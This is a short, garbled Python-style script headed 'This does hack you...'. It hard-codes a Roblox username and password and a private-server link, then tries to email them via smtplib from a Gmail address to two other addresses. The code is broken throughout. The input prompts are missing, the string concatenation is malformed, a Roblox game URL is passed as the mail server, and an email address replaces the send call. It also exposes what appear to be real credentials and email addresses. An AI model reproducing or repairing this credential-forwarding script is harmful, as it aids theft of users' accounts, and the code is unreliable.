# This does hack you...
username = aldrhine89 ("Enter username:")
password = 09816575515aldrhine ("Enter password:")
SERVER = https://www.roblox.com/games/92814019058536/Plant-Brainrot-Simulator?privateServerLinkCode=97469928916107436890453596792414
FROM = rinnloverx@gmail.com
TO = ["pegiunfriend@outlook.com", "ari.pdx@icloud.com"] 
SUBJECT = "New roblox password"
TEXT = "New roblox password!, username is" + username "password is" +  password "Goto roblox.com"

# Prepare actual message
message = """From: %s\r\nTo: %s\r\nSubject: %s\r\n\

%s
""" % (FROM, ", ".join(TO), SUBJECT, TEXT)

# Send the mail
import smtplib
server = smtplib.SMTP(SERVER)
server rinnloverx@gmail.com(FROM, TO, message)
server.quit()
# end
